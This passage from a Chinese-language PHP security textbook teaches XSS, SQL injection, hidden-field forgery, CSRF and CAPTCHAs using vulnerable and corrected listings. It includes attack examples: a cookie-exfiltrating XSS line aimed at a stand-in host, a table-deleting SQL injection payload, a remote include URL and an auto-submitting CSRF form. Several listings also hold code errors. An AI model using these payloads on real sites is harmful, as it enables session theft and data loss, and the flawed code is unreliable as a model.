<title>Login</title>
</head>
<body>
<form method="post" action="">
Username: <input type="text" name="user" /><br />
Password: <input type="password" name="password" /><br />
<input type="submit" value="Login" />
</form>
</body>
</html>
```

## 清单 32.1 一个糟糕的登录页面 ("login.php")

此页面检查指定的用户名和密码，如果匹配则显示相应消息（如您所见，示例大幅简化）。但如果您仔细查看，将在代码中发现一个重大设计错误。程序员假设 $loggedIn 变量未初始化，因此值为 false。但如果 register_globals 设置为 On，则访问保护可被轻易绕过。通过调用 login.php?loggedIn=1 页面，会自动创建值为 1 的 $loggedIn 变量，用户便被验证通过。

这个——诚然有点牵强——示例是从 PHP 4.2 开始默认禁用 register_globals 的原因之一。这一决定并非毫无争议；特别是 PHP 发明人 Rasmus Lerdorf 实际上是反对的。然而，更糟糕的是，即使是声誉良好的专业杂志和知名出版社，在数月甚至数年内继续发布代码，而这些代码显然未考虑到这一更改。这些尴尬的事件再次表明，与你正在写作的技术保持联系是至关重要的。顺便说一句：在当前的 PHP 版本中，register_globals 已完全不复存在。我们的哀悼有限。

> **注意**
> 
> 值得指出的是，清单 32.1 可以加以保护。为此，要么正确初始化 $loggedIn 变量：
> 
> $loggedIn = false;
> 
> 要么在 if 查询中添加一个 else 分支：
> 
> if (isset($_POST["user"]) &&
>     isset($_POST["password"]) &&
>     $_POST["user"] == "Christian" &&
>     $_POST["password"] == "*secret*") {
>     $loggedIn = true;
> } else {
>     $loggedIn = false;
> }

> **提示**
> 
> 更好的做法是将 `error_reporting` 设置为 `E_ALL`。这是良好的代码风格，可降低因开发过程中的粗心大意而产生安全漏洞的风险。启用此设置后，如果使用未初始化的变量，您将收到警告。
> 
> 然而，在生产服务器上，您应该将 `display_errors = Off` 设置为 Off，因为每条错误消息都会向攻击者泄露有关 Web 服务器的信息。

归根结底：必须检查用户输入。但应如何检查？这完全取决于如何使用用户输入。最重要的基本规则之一是永远不要信任用户输入。如果您的概念中包含“用户输入满足要求 X 和 Y”这一点，那么您可以直接把它扔进碎纸机。当然，善意的用户只会输入有意义的数据（至少大部分时间如此），但在像互联网这样的全球网络中，并非所有人都怀善意。所以要预期最坏的情况——并且*不要信任您的用户*！

## 32.2 XSS

在关于存在安全漏洞的网站的反复出现的恐怖故事中，经常出现的一个术语是 *跨站脚本*。它实际上应该缩写为 CSS，但这个缩写已被 *层叠样式表* 保留，因此选择了“X”，它通常代表 *跨*，本例中亦是如此。

XSS 的效果是，脚本代码从外部注入到当前页面中。这跨越了授权屏障，因为您可以诱骗网站相信注入的代码是您自己的。一个小示例将说明这一点。想象一个简单的留言簿应用程序，您在本书中经常见到过。在下面的清单中，您首先可以看到（糟糕的）用于将数据写入留言簿数据库的脚本（此处我们使用 SQLite）。

```
<?php
$entry = $_POST["entry"] ?? "";
if (!file_exists("guestbook.db")) {
    $db = new SQLite3("guestbook.db");
    $db->query(
        "CREATE TABLE entries (entry varchar(255))");
    $db->close();
}
if ($entry != "") {
    $db = new SQLite3("guestbook.db");
    $db->query(
        "INSERT INTO entries (entry) VALUES ('$entry')";
    echo "Your comment has been entered.";
    $db->close();
}
?>
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<form method="post" action="">
Comment: <textarea name="entry" cols="" rows=""></textarea><br />
<input type="submit" value="Enter" />
</form>
</body>
</html>
```

## 清单 32.2 签名留言簿 ("gb-enter-1.php")

乍看之下，清单 32.2 中的代码看起来不错且足够。当用户输入某内容时，它会被保存在 $entry 变量中：

```
$entry = $_POST["entry"] ?? "";
```

甚至之前所示的通过 URL 设置 $entry 的情况也被拦截了。您还能要求什么？老实说，就 XSS 而言，此脚本目前还没有错误（但还有另一个错误，您将在第 32.3 节中了解）。只有留言簿的输出是有问题的，如下一个清单所示。

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<?php
try {
    $db = new SQLite3("guestbook.db");
    $result = $db->query(
        "SELECT * FROM entries");
    while ($row = $result->fetchArray()) {
        echo $row["entry"] . "<hr />";
    }
    $db->close();
} catch (Exception $ex) {
}
?>
</body>
</html>
```

## 清单 32.3 (糟糕的) 条目输出 ("gb-show.php")

您看到错误了吗？如果做几个无害的条目然后读取它们，没有问题。但是，如果输入 HTML 代码会怎样？此代码会被原样输出。因此，您可以破坏留言簿的布局——例如，通过包含冒犯性图形。图 32.2 和图 32.3 显示了一种更无害的变体——即，在留言簿条目中使用 <hr /> 和其他 HTML 标签。

### 图 32.2 已输入（无害）的条目

![](img/ae7820c36e8f24c1623d26668b28e80e_869_0.png)

### 图 32.3 HTML 代码被原样输出

![](img/ae7820c36e8f24c1623d26668b28e80e_869_1.png)

仅此而已已经够糟了，但当注入 JavaScript 代码而不是 HTML 代码时，情况会更糟。[^1] 残忍程度有不同级别：

- 使用 window.alert() 打开模态警告窗口
- 使用 window.reload() 无限重新加载页面
- 使用 location.href = "http://anderserver.xy" 重定向用户
- 读取所有 cookie（未受保护的 cookie，将在本章后面说明）——例如，使用 location.href = "http://otherserver.xy/cookieft.php?c=" + escape(document.cookie)

出于充分理由，此处不再详细说明，但图 32.4 展示了第一种攻击方法的效果。

[^1]: 毫无疑问，也存在“糟糕”的 HTML 标记，例如 `<div style="display: none;">`。




![](img/ae7820c36e8f24c1623d26668b28e80e_870_0.png)

图 32.4 警告窗口从何而来？

再想想 Cookie 中可能存储了什么：比如当前的会话 ID。这样一来，很容易接管受害者的会话（这称为会话劫持）。

由此可见，数据必须经过过滤，无论是写入数据库还是读取时都要如此。可以使用 htmlspecialchars() 函数来完成此操作，它能可靠地将所有尖括号（以及其他“坏”字符：撇号、双引号和和号）转换为相应的 HTML 实体：

```
$coded = htmlspecialchars($input);
```

来自客户端（因此可能具有恶意）的所有内容都必须在输出前保存。除了 $_GET、$_POST 和 $_COOKIE 之外，这还包括 $_SERVER 中的一些条目，包括 $_SERVER["PHP_SELF"]。

> 注意
> 为了防止会话劫持和 Cookie 窃取，还可以使用 HttpOnly 标志保护会话 Cookie，防止其被 JavaScript 访问：
> session.cookie_httponly = "On"

因此，XSS 利用起来非常容易，但过去甚至专业杂志的网站也曾在此处易受攻击。尤其是那些 HTML 经验较少、看不出 Web 开发与桌面应用开发有多大区别的人，最容易受害。

最后，关于未检查用户数据的主题，举一个警示性的例子。假设你开发了（另一个）内容管理系统，且有以下类型的 URL：

- http://server/index.php?section=index
- http://server/index.php?section=products
- http://server/index.php?section=support
- http://server/index.php?section=imprint

然后，每个页面都可以找到以下代码：

```
<?php
$section = (isset($_GET["section"])) ? $_GET["section"] : "index";
include "$section.php";
?>
```

看起来不错，不是吗？例如，当调用 `index.php?section=products` 时，会包含文件 `products.php`。但如果进行以下调用会发生什么呢？

`http://server/index.php?sektion=http://www.xy.zzz/attack`

然后会包含 `http://www.xy.zzz/attack.php` URL（假设有相应的 PHP 配置；`allow_url_include` 必须设置为 `on`，但幸运的是它默认是 `off`，并且自 PHP 7.4.0 起已被弃用，因此将来会在某个时点被删除）。你就已成功将 PHP 代码注入到第三方网站中。可怕，不是吗？

## 与 XSS 斗争的希望

XSS 是一种可怕的攻击，自 2003 年起一直位列 OWASP 十大漏洞的第三名。虽然它在 2017 年跌至第七位，但 XSS——与 SQL 注入合并到新的 `Injection` 类别中（别问为什么！）——在 2021 年又回到了第三名。在此期间，曾有希望：几乎所有当前浏览器——Firefox 除外——都内置了 XSS 过滤器，可防止至少某些攻击（但并非所有攻击！）。然而，由于各种问题，这现在已成为过去式。

但 XSS 的终结应该不远了。借助内容安全策略（CSP）W3C 标准，有方法可以对浏览器中 JavaScript 代码的执行设置严格限制。有关 CSP 的更多信息，请访问 `https://w3.org/TR/CSP`。基本上，这涉及使用 HTTP 标头告诉浏览器如何处理页面上的内容——例如，允许从哪些来源加载 JavaScript 代码。使用 PHP 的 `header()` 函数，可以轻松创建此类标头。

## JSON 与 XSS

使用 JSON 时需要特别预防措施。假设你有一个端点，它通过 `json_encode()` 序列化数据，然后直接输出。跨站脚本攻击在这里理论上也是可能的！如果你输出的部分数据来自用户自己，则必须按照以下模式对特殊字符进行编码：

`echo json_encode($data, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);`

五种特殊 HTML 字符被转换为十六进制值，因此在浏览器中是无害的。

## 32.3 SQL 注入

如前所述，用于输入留言簿条目的代码仍有一个重大缺陷。问题出在以下语句中：

```
$db->query("INSERT INTO entries (entry) VALUES ('$entry')");
```

提醒一下：$entry 的值是通过 POST 传输的。到目前为止一切都好，但如果条目中包含撇号，比如 Shaquille O'Neal，会发生什么呢？那么 SQL 命令将如下所示：

```
INSERT INTO entries (entry) VALUES ('Shaquille O'Neal')
```

如你所见，该 SQL 命令无效。但这还不算糟。你觉得以下命令怎么样？

```
INSERT INTO entries (entry) VALUES (''); DELETE FROM entries --')
```

这里，一个（空）条目被插入数据库，然后数据库内容被完全删除。这两个连字符是 SQL 注释；也就是说，它们之后的所有内容都被忽略。这对网站来说将是一场灾难，因为所有留言簿条目会一下子全无。但将此类语句注入我们的脚本甚至可能吗？

是的，可能。这里你可以再次看到 SQL 命令，其中一节以粗体突出显示：

```
INSERT INTO entries (entry) VALUES (''); DELETE FROM entries --')
```

所有未加粗的内容都是 PHP 脚本中的 SQL 命令。所有加粗的内容都必须通过表单插入，事故已经发生。² 但可以对此做些什么？一种可能性是将所有撇号加倍：

```
$entry = str_replace("'", "''", $entry);
```

这是一种初步方法，但 SQL 中还有其他特殊字符，例如下划线或百分号（两者都用于 WHERE 子句）。因此有必要采取特殊措施。对于 MySQL，magic_quotes 也曾这样做过。SQL 注入是创建不受欢迎（且最近已被废除）magic quotes 功能的主要原因之一。MySQL 可以处理通过反斜杠转义的特殊字符，但这不属于 SQL 标准。因此，其他数据库不按预期解释此功能也不足为奇。但不要绝望：一些数据库模块提供额外的函数（或在 OOP API 中提供方法）来相应地处理用户输入。表 32.1 显示了选项。

2 诚然，并非所有数据库系统都如此。例如，在 MySQL 中，一次只能执行一条命令；因此 DELETE 将不再被数据库使用。但还有其他危险的 SQL 注入变体，从那种情况下会生效（从攻击者的角度来看）。

| 模块 | 函数 |
| :--- | :--- |
| MySQL | mysqli_real_escape_string()/MySQLi::real_escape_string() |
| SQLite | SQLite3::escapeString() |
| MSSQL | - |
| PostgreSQL | pg_escape_string() |
| Oracle | - |

表 32.1 转义特殊字符的函数

如你所见，对于某些数据库系统来说，情况相当不乐观——但幸运的是，这些系统无论如何都提供首选的预处理语句作为安全方法。以下代码清单展示了在 MySQL 中使用 PHP 的 mysqli 扩展的示例。

```
<?php
$entry = $_POST["entry"] ?? "";

if ($db = mysqli_connect("server", "user", "password",
    "guestbook")) {
    if ($stmt = mysqli_prepare($db,
        "INSERT INTO entries (entry) VALUES (?)")) {
        mysqli_stmt_bind_param($stmt, "s", $entry);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    mysqli_close($db);
}
?>
<html>
<head>
    <title>Guestbook</title>
</head>
<body>
    <form method="post" action="">
        Comment: <textarea name="entry" cols="" rows=""></textarea><br />
        <input type="submit" value="Enter" />
    </form>
</body>
</html>
```

清单 32.4 输入的更好脚本 ("gb-enter-2.php")

SQL 注入尤其糟糕，因为它可能对 Web 服务器造成严重损害。因此，处理用户输入的每个数据库查询都要小心。即使是专业杂志也经常包含未过滤外部数据且因此易受 SQL 注入影响的代码。你可以安全地在自己的网站上自行测试这一点。如果你有通过 URL 传输数据的页面（例如 news.php?id=123），请插入一个撇号（news.php?id=123'）。如果收到 PHP 错误消息，则存在两个潜在危险点：

1. 页面未过滤或验证用户输入。
2. 页面向客户端输出 PHP 错误消息，从而免费向攻击者提供宝贵信息。

## 32.4 隐藏字段

在处理恶意输入数据方面，还有另一种棘手但简单的攻击选项。为了说明这一点，我们先展示另一个例子。在本章开头，我们展示了构建不良的 CMS，它使用以下链接：

```
<a href="edit.php?id=23">Edit article #23</a>
<a href="edit.php?id=24">Edit article #24</a>
<a href="edit.php?id=27">Edit article #27</a>
```

在扩展版本中，还有这些链接：

```
<a href="delete.php?id=23">Delete article #23</a> <a href="delete.php?id=24">Delete article #24</a>
<a href="delete.php?id=27">Delete article #27</a>
```

当然，这同样不安全，但程序员想出了一个办法。有人告诉他，通过 GET/URL 注入数据非常容易，于是他想出了更难的方法。当调用 delete.php 脚本时，用户仍需确认整个操作。要删除的新闻文章作为隐藏字段发送回服务器，因此对用户（和攻击者）不可见。计划就是这样。以下代码清单显示了相应的代码；图 32.5 和图 32.6 显示了浏览器中的输出。

```
<html>
<head>
<title>Delete</title>
</head>
<body>
<?php
$id_GET = $_GET["id"] ?? "";
```





```php
$id_POST = $_POST["id"] ?? "";

if ($id_GET != "" && $id_POST == "") {
?>
<form method="post">
<input type="hidden" name="id"
value="<?php echo htmlspecialchars($id_GET); ?>" />
<input type="submit" value="Confirm deletion" />
</form>
<?php
}

if ($id_GET != "" && $id_POST != "") {
    delete_entry($id_POST); //yet to be implemented ;-)
    echo "<b>Entry deleted!</b>";
}
?>
</body>
</html>
```

### 列表 32.5 删除数据的（糟糕）方法（“delete.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_875_0.png)

### 图 32.5 首先用户确认删除 …

![](img/ae7820c36e8f24c1623d26668b28e80e_875_1.png)

### 图 32.6 … 然后 Web 服务器才执行它

这种方法不仅糟糕，而且致命，因为这里也使用了未经检查的用户数据。仅仅因为 POST 数据无法如此轻松方便地在 URL 中传输，并不意味着无法伪造 HTTP 请求。在此情况下，甚至有一种非常简单的方法可以欺骗 delete.php 脚本：

- 1. 在 Web 浏览器中调用脚本。
- 2. 将 HTML 代码保存到本地硬盘。
- 3. 将代码中 `<form>` 标记的 `action` 属性设置为原始脚本的 URL。
- 4. 将隐藏字段的值更改为不同的 ID。
- 5. 在 Web 浏览器中打开（本地）表单并提交。Web 服务器上的脚本被调用，伪造的 ID 通过 POST 传输。

图 32.7 显示了新代码；更改或添加的区域已高亮显示。

> **注意**
>
> 大多数浏览器都内置了工具，使得更改表单数据特别容易（通常可以通过 `[F12]` 访问）。因此，隐藏的表单字段并不不可见！

不要认为这种攻击过于简单而（已）过时。就在几年前，一个相对知名的在线商店中发现了一个基于这种攻击方法的安全漏洞。

```html
<html>
<head>
<title>Delete</title>
</head>
<body>
<form method="post" action="http://server.xy/delete.php">
<input type="hidden" name="id"
value="99" />
<input type="submit" value="Confirm deletion" />
</form>
</body>
</html>
```

### 图 32.7 HTML 代码可以在编辑器中本地修改

## 32.5 输入过滤

PHP 拥有一个内置扩展，用于处理输入过滤。该包的最初开发者是 Derick Rethans 和 PHP 发明者 Rasmus Lerdorf。

该扩展无需进一步安装步骤即可使用。它不在 SAPI 级别运行，因此不会在 PHP 看到输入之前拦截任何输入。相反，该过滤器实现了几个函数，这些函数以这种方式过滤数据，使得最终（按计划）不包含任何有害内容。

该扩展的主要函数之一是 `filter_input()`，用于确定 GET、POST 和 Cookie 数据。你指定数据类型（`INPUT_GET`、`INPUT_POST`、`INPUT_COOKIE`），然后是名称，最后是所需的数据类型。如果不满足此条件，则 filter_input() 返回值 0；否则返回输入值。以下示例大致基于第 13 章中的虚构订单表单。

```html
<html>
<head>
<title>Order Form</title>
</head>
<body>
<?php
$ok = false;
if (isset($_POST["Submit"])) {
$ok = true;
if (filter_input(INPUT_GET, "Email", FILTER_VALIDATE_EMAIL) == null) {
$ok = false;
}
if (filter_input(INPUT_POST, "Number", FILTER_VALIDATE_INT) == null) {
$ok = false;
}
if ($ok) {
?>
<h1>Form data</h1>
<?php
$Email = htmlspecialchars(filter_input(INPUT_POST, "Email",
FILTER_SANITIZE_EMAIL));
$Number = filter_input(INPUT_POST, "Number", FILTER_SANITIZE_NUMBER_INT);
echo "<p><b>$Number of tickets for $Email</b></p>";
?>
<?php
} else {
echo "<p><b>Form incomplete</b></p>";
}
}

if (!$ok) {
?>
<h1>World Cup Ticket Service</h1>
<form method="post" action="">
Email address <input type="text" name="Email" /><br />
Number of tickets
<select name="Number">
<option value="0">Please select</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
</select><br />
<input type="submit" name="Submit" value="Place order" />
</form>
<?php
}
?>
</body>
</html>
```

### 列表 32.6 表单数据已过滤（“filter.php”）

filter_input() 第三个参数的可能值包括以下内容：

- **FILTER_SANITIZE_EMAIL**  
  删除不属于电子邮件地址的所有内容。

- **FILTER_SANITIZE_ENCODED**  
  对数据进行 URL 编码。

- **FILTER_SANITIZE_ADD_SLASHES**  
  在特殊字符前添加反斜杠（内部调用 addslashes()）。

- **FILTER_SANITIZE_NUMBER_FLOAT**  
  删除不属于浮点数的所有内容。

- **FILTER_SANITIZE_NUMBER_INT**  
  删除不属于整数的所有内容。

- **FILTER_SANITIZE_SPECIAL_CHARS**  
  将所有特殊字符编码为 HTML 实体。

- **FILTER_SANITIZE_STRING 和 FILTER_SANITIZE_STRIPPED**  
  删除 HTML 特殊字符。请注意，自 PHP 8.1.0 起，这些过滤器已被弃用；建议改用 htmlspecialchars()。

- **FILTER_SANITIZE_UNSAFE_RAW**  
  不删除 HTML 特殊字符。

- **FILTER_SANITIZE_URL**  
  删除不属于 URL 的所有内容。

> **验证和清理**
>
> 列出的所有过滤器的名称中都包含 SANITIZE。这表明过滤器会更改输入数据，并且 filter_input() 返回新值。但是，如果将 SANITIZE 替换为 VALIDATE，则 filter_input() 仅检查（不更改）并返回 true 或 false（或 null），具体取决于数据是否被认为有效。

也可以为 filter_input() 提供第四个参数，用于指定其他信息。例如，存在 FILTER_VALIDATE_REGEXP 过滤器类型，它期望一个用于检查的正则表达式——但开头和结尾没有定界符：

```php
$Number = filter_input(INPUT_POST,
    "Number",
    FILTER_VALIDATE_REGEXP,
    ["regexp" => "^[1-9]\d*$"]);
```

PHP 输入过滤器的第二个主要函数是 filter_var()。你将其传递数据（例如字符串），然后选择过滤器类型。这些与我们之前讨论的类型相同。一如既往，完整列表可在 PHP 手册中找到，网址为 http://php.net/manual/filters.php。

以下列表显示了基于第 26 章中类似应用程序的示例。

```html
<form method="post" action="">
URL: <input type="text" name="url" value="<?php
echo (isset($_POST["url"]) && is_string($_POST["url"])) ? htmlspecialchars($_POST["url"]) : "";
?>"/>
</form>
<hr />
<?php
if (filter_input(INPUT_POST, "url", FILTER_VALIDATE_URL) == null) {
    $url = filter_input(INPUT_POST, "url", FILTER_SANITIZE_URL);
    $data = filter_var($url, FILTER_SANITIZE_STRING);
    echo "<pre>$data</pre>";
}
?>
```

### 列表 32.7 读取 URL 并移除 HTML 标记（“textversion.php”）

该扩展还有几个其他功能，但这些示例对于初步了解应该足够了。相应文档可在 http://s-prs.co/v602247 找到。

> **注意**
>
> 另一类有趣的功能包含在 ctype 扩展中，该扩展也会自动激活。有关此内容的信息可在 http://php.net/ctype 找到。

## 32.6 跨站请求伪造

跨站请求伪造（CSRF）在某种程度上被 XSS 和 SQL 注入等“大”竞争对手攻击所掩盖，甚至在 2017 年被从 OWASP Top 10 中移除——但它在 2021 年作为顶级条目（访问控制受损）的子项回归。CSRF 不仅非常危险，而且在 Web 上变得越来越普遍。在安全审计中，我们越来越发现，许多 XSS 和 SQL 注入漏洞已得到修复，但其他攻击却被完全忽视了。这是怎么回事？用户向网站发送数据；这些数据可以是简单的 GET 请求或 POST 请求。诀窍在于，用户通常是非自愿且无意地发送数据。让我们看一个非常简化的示例。假设你访问了一个内置了以下 HTML 的任意网站：

```html
<img src="http://victim.xy/order.php?articleId=123&quantity=1"
width="1" height="1" />
```

因此，你的浏览器将向服务器 victim.xy 发送 HTTP 请求，同时——如 URL 中示意所示——发送订单信息。再做一个简化的假设：你是 victim.xy 的客户，已经登录，并且会基于此类 GET 请求自动下单。因此，你在并不真正想要的情况下订购了一份文章 123。图 32.8 再次以图形方式显示了流程。

![](img/ae7820c36e8f24c1623d26668b28e80e_880_0.png)

### 图 32.8 CSRF 的工作原理

在这种情况下，CSRF 之所以有效，是因为用户已登录受攻击的网站（通常通过会话 Cookie），并且浏览器在向同一服务器发出请求时会自动发送此 Cookie。因此，有些人也将 CSRF 称为会话劫持，尽管“跨站请求伪造”一词现在已成为通用说法（严格来说，会话劫持只涉及 CSRF 的一个方面）。

当然，在实际中，情况并不总是如此简单，因为 POST 用于订单等重要操作。但这也可以通过 CSRF 进行攻击。请查看以下列表中的表单。

```html
<html>
<head>
<title>Order Form</title>
```





```
</head>
<body>
<?php
if (isset($_POST["quantity"]) &&
(int)$_POST["quantity"] > 0 &&
isset($_POST["articleId"])) {
file_put_contents(
"orders.txt",
sprintf("%d x article %s - %s\n",
(int)$_POST["quantity"],
$_POST["articleId"],
date("Y-m-d H:i:s")),
FILE_APPEND);
echo "Order submitted!";
}
?>
<form method="post" action="">
Quantity: <input type="text" name="quantity" /><br />
<input type="hidden" name="articleId" value="123" />
<input type="submit" value="Order" />
</form>
</body>
</html>
```

# 清单 32.8 乍一看，一个无害的表单 ("order.php")

要执行此代码，脚本需要对当前目录（更准确地说，是对 *orders.txt* 文件）的写入权限。一般而言，每当出现文本 *订单已提交！* 时，即表示已下单；为了更好的可追溯性，此事实也会写入 *orders.txt*。

应用程序现在信任发送到 *order.php* 脚本的 POST 请求总是会按照用户的意图发送。我们已经解释过，情况不一定总是如此。例如，考虑以下 HTML 文件（包含少量 JavaScript 代码）：

```
<form method="POST" action="http://victim.xy/php/order.php">
<input type="hidden" name="articleId" value="123" />
<input type="hidden" name="quantity" value="10" />
</form>
<script>
window.onload = function() {
document.forms[0].submit();
}
</script>
```

如果将 `action` 属性的值调整为适合您系统的值，也可以利用它无意中下单：任何打开该 HTML 文件的人都会在受害者网站上下单。

> **注意**
> 您将立即在浏览器中看到带有订单确认的页面。一个“真正的”攻击者会将隐藏表单放在 iframe 中，例如，以防止这种效果。

防御此类攻击有多种方法。这些方法包括下单前再次登录和短会话超时等一般安全措施。但是，还经常被建议的措施，例如检查 HTTP 来源页面和检查 IP 地址，遗憾的是在实践中并不总是能取得预期效果。

目前公认为安全的一种防护措施如下：主要问题是，攻击者可以准确猜测相应订单的 HTTP 请求长什么样。为防止这种情况，我们插入一个包含随机值的额外隐藏表单字段。为此，我们使用 `random_bytes()` 函数来确定一个相应的不可预测字符串：

```
<?php
$token = random_bytes(32);
?>
...
<input type="hidden" name="token" value="<?php echo $token; ?>" />
```

我们同时将此随机值保存在会话中：

```
$_SESSION["token"] = $token;
```

如果现在发送表单，我们检查随表单发送的值是否与会话中的值相同。这可以防止 CSRF 攻击尝试，因为攻击者既无法影响用户的会话，也无法预先猜出密钥令牌是什么，因为它每次都不同。

这样一来，我们就可以使用清单 32.8 中的表单，集成并验证令牌，从而在下一个清单中对其进行改进。

```
<?php
session_start();
?>
<html>
<head>
<title>Order Form<title>
</head>
```

```
<body>
<?php
$token = "";

if (isset($_POST["quantity"]) &&
(int)$_POST["quantity"] > 0 &&
isset($_POST["articleId"]) &&
isset($_SESSION["token"]) &&
isset($_POST["token"]) &&
$_SESSION["token"] == $_POST["token"]) {
file_put_contents(
"orders.txt",
sprintf("%d x article %s - %s\n",
(int)$_POST["quantity"],
$_POST["articleId"],
date("Y-m-d H:i:s")),
FILE_APPEND);
echo "Order submitted!";
unset($_SESSION["token"]);
} else {
$token = random_bytes(32);
$_SESSION["token"] = $token;
}
?>

<form method="post" action="">
Quantity: <input type="text" name="quantity" /><br />
<input type="hidden" name="articleId" value="123" />
<input type="hidden" name="token" value="<?php echo $token; ?>" />
<input type="submit" value="Order" />
</form>
</body>
</html>
```

# 清单 32.9 改进的订单表单 ("order-token.php")

试试看：您仍然可以通过直接调用表单来下单。但是，如果使用该 HTML 文件（您必须调整表单提交目标），您将进入“正常”订单页面，但订单不会自动发送或写入文本文件。

> **注意**
> 防御 CSRF 的另一项额外措施是使用 SameSite Cookie，已在第 14 章中讨论过。以下 php.ini 设置为所有 PHP 会话激活特定的 SameSite 模式：

```
session.cookie_samesite = "Lax"
```

现代网络浏览器将逐渐默认将 Cookie 视为 SameSite=Lax，这会使利用 CSRF 漏洞变得困难得多。

## 32.7 屏幕抓取与验证码

压轴戏：为了结束对攻击者心态的简要了解，我们呈现一种特别阴险的攻击。假设您想提供一个显示当前股票价格的页面，但自己又不想为价格支付任何费用。没问题：只需在后台使用 PHP 调用一个交易所网站，读取价格（例如，使用正则表达式），并在您的页面上显示它们——当然，使用您自己的布局。这听起来不错，也非常有效——而且是违法的。

> **注意**
> 顺便说一句，这个过程称为屏幕抓取。

另一个例子：假设您想尽可能多地发送垃圾邮件。免费邮箱服务商在一定限度内适合此目的。您可以在那里创建新账户并发送广告邮件，直到账户被封锁，穿制服的人站在您家门口。但使用上一节的技术会方便得多：将注册表单保存到本地，分析它，然后以修改后的形式发送回服务器——最好是全部自动化。这样，您只需点击一下按钮就可以创建多个账户。别笑：一些不知名的网站上有正是这样做的软件。

这两种场景有一个共同点：对网站来说非常不愉快，因为它无法分辨线另一端是人还是机器。早在 20 世纪 50 年代，英国数学家艾伦·图灵就定义了一种测试，可以用来判断通信对象是人还是机器。2000 年，即 50 年后，四位研究人员联合起来，将这一概念应用于 Web。他们将自己的创造命名为 Completely Automated Public Turing test to tell Computers and Humans Apart (CAPTCHA)。与传统的图灵测试不同，验证码完全自动运行，因此无需人工来检查。

现在，许多网站都使用验证码。图 32.9 显示了一个在访问 Amazon 网站时随机出现且必须解决的验证码。

在这种情况下，验证码是一张包含字母和数字组合（通常仅为字母）的图形，用户需要将其输入。单个字符被扭曲，以至于计算机程序难以识别文本。

![](img/ae7820c36e8f24c1623d26668b28e80e_885_0.png)

图 32.9 “amazon.com” 上的验证码

> **注意**
> CAPTCHA 项目的官方（但不再维护）主页可在 www.captcha.net 上找到。关于目前最知名的验证码系统 reCAPTCHA 的更多信息，可在 http://s-prs.co/v602290 上找到。

不过，验证码并非金石良方，而仅仅是一种新解毒剂，这反过来又需要相应的对策。例如，一些科学家已经能够相对可靠地破解广泛使用的 Gimpy 验证码。³ 尽管如此，验证码至少会使自动发送表单变得稍微困难一些。

> **注意**
> 某些缺点不应隐瞒。图形验证码要求用户在其网络浏览器中显示图形，或者浏览器本身必须能够显示图形；因此，Lynx 文本浏览器的用户被排除在外。视障网络冲浪者也是如此。因此必须提供替代方案；例如，Yahoo! 提供一条热线。

3 见 http://s-prs.co/v602291。





为演示目的，我们将使用一个现有的验证码——即来自 PEAR Text_CAPTCHA 项目的验证码，安装方法如下：

```php
pear install Text_CAPTCHA
```

> **注意**
>
> 如果在书籍出版时软件包尚未发布稳定版本，则必须明确声明软件包的状态——例如，如下所示：
>
> `pear install Text_CAPTCHA-alpha`
>
> 您可以在软件包主页 <http://s.prs.co/v602248> 上找到当前版本号。您还需要事先安装 Image_Text 和 Text_Password PEAR 软件包，以便验证码软件包的安装正常工作。

安装软件包后，您可以按如下方式请求验证码图形并接收它——在我们的示例中，为 PNG 格式：

```php
<?php
require_once 'Text/CAPTCHA.php';

$c = Text_CAPTCHA::factory('Image'); //graphic CAPTCHA
$c->init(200, 80); //200, 80 pixels

$phrase = $c->getPhrase(); //text in CAPTCHA
$png = $c->getCAPTCHAAsPNG();
?>
```

然而，仅凭这些并不能起到多大作用。您还需要处理管理工作。以下示例直接基于软件包文档。验证码中的术语存储在会话变量中，并按此方式检查。但首先，需要启动 PHP 会话支持：

```php
session_start();
```

$ok 变量用于记录验证码是否已解答：

```php
$ok = false;
```

在浏览器中显示的文本保存在 $info 变量中：

```php
$info = "Please enter text in the image!";
```

如果要再次显示验证码（此时 $ok 为 false），则会生成新图形，并将生成的 PNG 图像保存到文件中。然后将此文件与文本输入表单字段一起显示：

```php
if (!$ok) {
require_once 'Text/CAPTCHA.php';

$c = Text_CAPTCHA::factory('Image');
$c->init(200, 80);

$_SESSION["phrase"] = $c->getPhrase();

file_put_contents(sha1(session_id()) . ".png", $c->getCAPTCHAAsPNG());

echo "<form method=\"POST\">" .
"<img src=\"" . sha1(session_id()) . ".png?" . time() . "\" />" .
"<input type=\"text\" name=\"phrase\" />" .
"<input type=\"submit\" /></form>";
}
```

> > **提示**
> > 附加当前的纪元格式时间（使用 `time()` 调用）可防止Web浏览器将旧验证码保存在缓存中。

但是，当用户尝试解答验证码时会发生什么？在这种情况下，输入会与会话变量中的验证码解答词进行比较，并相应地设置 `$ok` 变量（以及 `$info` 变量）：

```php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
if (isset($_POST["phrase"]) && isset($_SESSION["phrase"]) &&
strlen($_POST["phrase"]) > 0 && strlen($_SESSION["phrase"]) > 0 &&
$_POST["phrase"] == $_SESSION["phrase"]) {
$info = "OK!";
$ok = true;
unset($_SESSION['phrase']);
} else {
$info = "Please try again!";
unset($_SESSION['phrase']);
}
unlink(sha1(session_id()) . ".png");
}
```

状态消息在末尾输出：

```php
echo "<p>$info</p>";
```

以下代码清单展示了此示例的完整代码：图 32.10 显示了输出。

```php
<?php
    session_start();
    $ok = false;
    $info = "Please enter text in the image!";
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST["phrase"]) && isset($_SESSION["phrase"]) &&
            strlen($_POST["phrase"]) > 0 && strlen($_SESSION["phrase"]) > 0 &&
            $_POST["phrase"] === $_SESSION["phrase"]) {
            $info = "OK!";
            $ok = true;
            unset($_SESSION['phrase']);
        } else {
            $info = "Please try again!";
            unset($_SESSION['phrase']);
        }
        unlink(sha1(session_id()) . ".png");
    }

echo "<p>$info</p>";

if (!$ok) {
    require_once 'Text/CAPTCHA.php';

    $c = Text_CAPTCHA::factory('Image');
    $c->init(200, 80);

    $_SESSION["phrase"] = $c->getPhrase();

    file_put_contents(sha1(session_id()) . ".png", $c->getCAPTCHAAsPNG());

    echo "<form method=\"POST\">" .
        "<img src=\"" . sha1(session_id()) . ".png?" . time() . "\" />" .
        "<input type=\"text\" name=\"phrase\" />" .
        "<input type=\"submit\" /></form>";
